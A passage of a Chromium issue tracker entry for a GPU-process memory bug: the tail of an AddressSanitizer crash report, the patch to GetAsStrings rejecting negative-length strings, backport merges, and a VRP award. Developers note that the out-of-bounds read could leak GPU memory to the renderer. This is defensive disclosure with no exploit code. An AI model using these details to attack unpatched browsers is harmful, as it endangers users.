    #19 0x00035bd149a4 in base::MessagePumpCFRunLoopBase::RunWorkSource(void*)+0xec (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x124c09a4)
    #20 0x00019b3549f4 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f9f4)
    #21 0x00019b354988 in __CFRunLoopDoSource0+0xa8 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f988)
    #22 0x00019b3546f4 in __CFRunLoopDoSources0+0xe4 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f6f4)
    #23 0x00019b353384 in __CFRunLoopRun+0x330 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5e384)
    #24 0x00019b40de30 in _CFRunLoopRunSpecificWithOptions+0x210 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x118e30)
    #25 0x00019d5a2960 in -[NSRunLoop(NSRunLoop) runMode:beforeDate:]+0xd0 (/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation:arm64e+0xa5b960)
    #26 0x00035bd176bc in base::MessagePumpNSRunLoop::DoRun(base::MessagePump::Delegate*)+0xc8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x124c36bc)
    #27 0x00035bd136fc in base::MessagePumpCFRunLoopBase::Run(base::MessagePump::Delegate*)+0x290 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x124bf6fc)
    #28 0x00035bbf8694 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x32c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x123a4694)
    #29 0x00035bb1d584 in base::RunLoop::Run(base::Location const&)+0x430 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x122c9584)

SUMMARY: AddressSanitizer: use-after-poison (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Libraries/libGLESv2.dylib:arm64+0x16e85c8) in gl::JoinShaderSources(int, char const* const*, int const*)+0x10c
Shadow bytes around the buggy address:
  0x602000071b80: f7 fa fd fd f7 fa fd fd f7 fa fd fd f7 fa fd fa
  0x602000071c00: f7 fa fd fa f7 fa fd fd f7 fa fd fa f7 fa 00 00
  0x602000071c80: f7 fa 00 00 f7 fa fd fd f7 fa fd fd f7 fa fd fd
  0x602000071d00: f7 fa fd fd f7 fa 00 00 f7 fa fd fd f7 fa fd fd
  0x602000071d80: f7 fa fd fd f7 fa 00 fa f7 fa fd fd f7 fa 00 fa
=>0x602000071e00: f7 fa 00[06]f7 fa fd fd f7 fa 00 00 f7 fa 00 fa
  0x602000071e80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000071f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000071f80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000072000: f7 fa fd fa f7 fa fd fa f7 fa fd fd f7 fa 00 fa
  0x602000072080: f7 fa fd fd f7 fa fd fa f7 fa fd fa f7 fa fd fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

NOTE: the stack trace above identifies the code that *accessed* the poisoned memory.
To identify the code that *poisoned* the memory, try the experimental setting ASAN_OPTIONS=poison_history_size=<size>.

==74608==ADDITIONAL INFO

==74608==Note: Please include this section with the ASan report.
Task trace:
    #0 0x0003515ed40c in gpu::Scheduler::RunNextTask()+0x424 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7d9940c)
    #1 0x0003515e8e90 in gpu::Scheduler::TryScheduleSequence(gpu::Scheduler::Sequence*)+0x48c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Chromium Framework:arm64+0x7d94e90)


Command line: `/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7704.0/Helpers/Chromium Helper.app/Contents/MacOS/Chromium Helper --type=gpu-process --user-data-dir=./userdata --start-stack-profiler --gpu-preferences=SAAAAAAAAAAgAQAEAAAAAAAAAAAAAMAAAwAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --shared-files --metrics-shmem-handle=1752395122,r,12685374314863806918,592910499242119785,262144 --field-trial-handle=1718379636,r,384077398690993876,6303016396293783769,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,17938856887601769204,9024942082520916427,4 --trace-process-track-uuid=3190708988185955192 --seatbelt-client=28 --user-data-dir=/Users/test/Library/Application Support/Chromium`


==74608==END OF ADDITIONAL INFO

```
## Credit

86ac1f1587b71893ed2ad792cd7dde32

## Timeline

### li...@chromium.org (2026-02-26)

@sy...@chromium.org do you mind taking a look at this or rerouting as necessary?

### ch...@google.com (2026-02-27)

Setting milestone because of s2 severity.

### ch...@google.com (2026-02-27)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security Impact hotlist or the Severity field, and remove the ReleaseBlock hotlist.

### dx...@google.com (2026-03-06)

Project: chromium/src  

Branch:  main  

Author:  Corentin Wallez [cwallez@chromium.org](mailto:cwallez@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7633547>

CommonDecoder::Bucket::GetAsStrings error on negative length strings

---


Expand for full commit details
```
     
    Also add a smoke test for GetAsStrings and a test that fails without the 
    fix. 
     
    Bug: 487755344 
    Change-Id: I3f4190c99f292a893fb33da0c86f9d6561633d00 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7633547 
    Commit-Queue: Corentin Wallez <cwallez@chromium.org> 
    Reviewed-by: Geoff Lang <geofflang@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1595284}

```

---

Files:

- M `gpu/command_buffer/service/common_decoder.cc`
- M `gpu/command_buffer/service/common_decoder_unittest.cc`

---

Hash: [bbdb9c676973dc7bcce44ff1504bc5934f13cd75](https://chromiumdash.appspot.com/commit/bbdb9c676973dc7bcce44ff1504bc5934f13cd75)  

Date: Fri Mar 6 10:50:53 2026


---

### cw...@chromium.org (2026-03-06)

Asking for a merge to beta but not stable because it seeems that the arbitrary pointer read either crash, or construct a string that's validated by the ANGLE shader compiler afterwards anyway. (arbitrary strings can already be sent by the renderer process).

### ch...@google.com (2026-03-07)

Merge review required: M146 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### cw...@chromium.org (2026-03-09)

1. This is an important security issue that's a crash, and while I don't think it could be used to trigger an exploit, we should be safe and merge it.
2. <https://chromium-review.googlesource.com/7633547>
3. It's been on Canary since March 6
4. No
5. N/A
6. I'm not asking for a merge in stable.

### dr...@chromium.org (2026-03-09)

cwallez@ - can you help me understand the security implications here? I would have expected that there is an information leak here, but [#comment6](https://issues.chromium.org/issues/487755344#comment6) sounds like an attacker doesn't gain anything except the ability to crash the GPU process. If that's accurate, I don't think we should classify this as a security bug at all.

### cw...@chromium.org (2026-03-10)

Ah there might be an information leak because there is a getter for the shader source that returns whatever ANGLE read, so the OOB could be used to read GPU process memory and return it to the renderer process.

### dr...@chromium.org (2026-03-10)

Okay I think this does merit a merge then, approved for M146.

### dx...@google.com (2026-03-10)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Corentin Wallez [cwallez@chromium.org](mailto:cwallez@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7654255>

[M146] CommonDecoder::Bucket::GetAsStrings error on negative length strings

---


Expand for full commit details
```
     
    Also add a smoke test for GetAsStrings and a test that fails without the 
    fix. 
     
    (cherry picked from commit bbdb9c676973dc7bcce44ff1504bc5934f13cd75) 
     
    Bug: 487755344 
    Change-Id: I3f4190c99f292a893fb33da0c86f9d6561633d00 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7633547 
    Commit-Queue: Corentin Wallez <cwallez@chromium.org> 
    Reviewed-by: Geoff Lang <geofflang@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1595284} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7654255 
    Commit-Queue: Geoff Lang <geofflang@chromium.org> 
    Auto-Submit: Corentin Wallez <cwallez@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7680@{#2286} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `gpu/command_buffer/service/common_decoder.cc`
- M `gpu/command_buffer/service/common_decoder_unittest.cc`

---

Hash: [471f05cb59304827c861e39ec033b0e27f64f7f9](https://chromiumdash.appspot.com/commit/471f05cb59304827c861e39ec033b0e27f64f7f9)  

Date: Tue Mar 10 19:55:34 2026


---

### sr...@chromium.org (2026-03-16)

PTAL at the RBS for 147,  Stable RC cut for 147 is next week so please help get these fixes landed on trunk and verify on canary and request a merge to 147 , We will cut RC build next tuesday march 24
If this is not a blocker for 147 stable, please drop the RBS label on the bug

### cw...@chromium.org (2026-03-17)

The original commit was in 147 already. Removing RBS.

### pe...@google.com (2026-03-17)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### pe...@google.com (2026-03-20)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-03-20)

1. https://chromium-review.git.corp.google.com/c/chromium/src/+/7686951
2. Low - There was no conflict.
3. 146.
4. Yes, M144 has the same codebase. And also, when `CommonDecoderTest.GetAsStrings_StringsSizeNegative` added by the patch  was executed in M144 without the patch, the test failed. It means that the patch should be merged.

### pe...@google.com (2026-03-20)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-03-20)

1. https://chromium-review.git.corp.google.com/c/chromium/src/+/7686950
2. Low - There was no conflict.
3. 146.
4. Yes, M138 has the same codebase. And also, when `CommonDecoderTest.GetAsStrings_StringsSizeNegative` added by the patch  was executed in M138 without the patch, the test failed. It means that the patch should be merged.

### an...@google.com (2026-03-30)

Merge approved for LTS-138 and LTS-144

### dx...@google.com (2026-04-02)

Project: chromium/src  

Branch:  refs/branch-heads/7204  

Author:  Corentin Wallez [cwallez@chromium.org](mailto:cwallez@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7686950>

[M138-LTS] CommonDecoder::Bucket::GetAsStrings error on negative length strings

---


Expand for full commit details
```
     
    Also add a smoke test for GetAsStrings and a test that fails without the 
    fix. 
     
    (cherry picked from commit bbdb9c676973dc7bcce44ff1504bc5934f13cd75) 
     
    Bug: 487755344 
    Change-Id: I3f4190c99f292a893fb33da0c86f9d6561633d00 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7633547 
    Commit-Queue: Corentin Wallez <cwallez@chromium.org> 
    Reviewed-by: Geoff Lang <geofflang@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1595284} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7686950 
    Reviewed-by: Victor Gabriel Savu <vsavu@google.com> 
    Owners-Override: Victor Gabriel Savu <vsavu@google.com> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7204@{#3513} 
    Cr-Branched-From: d5de512dc9dc8ddfe4e6d71b0637578bb6158683-refs/heads/main@{#1465706}

```

---

Files:

- M `gpu/command_buffer/service/common_decoder.cc`
- M `gpu/command_buffer/service/common_decoder_unittest.cc`

---

Hash: [cefeb11df6c167cab8d2587ed1574075cf9dbd3e](https://chromiumdash.appspot.com/commit/cefeb11df6c167cab8d2587ed1574075cf9dbd3e)  

Date: Thu Apr 2 03:16:55 2026


---

### dx...@google.com (2026-04-16)

Project: chromium/src  

Branch:  refs/branch-heads/7559  

Author:  Corentin Wallez [cwallez@chromium.org](mailto:cwallez@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7686951>

[M144-LTS] CommonDecoder::Bucket::GetAsStrings error on negative length strings

---


Expand for full commit details
```
     
    Also add a smoke test for GetAsStrings and a test that fails without the 
    fix. 
     
    (cherry picked from commit bbdb9c676973dc7bcce44ff1504bc5934f13cd75) 
     
    Bug: 487755344 
    Change-Id: I3f4190c99f292a893fb33da0c86f9d6561633d00 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7633547 
    Commit-Queue: Corentin Wallez <cwallez@chromium.org> 
    Reviewed-by: Geoff Lang <geofflang@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1595284} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7686951 
    Reviewed-by: Victor Gabriel Savu <vsavu@google.com> 
    Owners-Override: Victor Gabriel Savu <vsavu@google.com> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7559@{#4821} 
    Cr-Branched-From: 223dfbac1c7542a06b422390d954afe5b560b607-refs/heads/main@{#1552494}

```

---

Files:

- M `gpu/command_buffer/service/common_decoder.cc`
- M `gpu/command_buffer/service/common_decoder_unittest.cc`

---

Hash: [d5ea5274de0eec3146b9d51587a85047b51ee243](https://chromiumdash.appspot.com/commit/d5ea5274de0eec3146b9d51587a85047b51ee243)  

Date: Thu Apr 16 05:37:42 2026


---

### sp...@google.com (2026-06-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
Baseline. User information disclosure.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-06-24)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/487755344)*
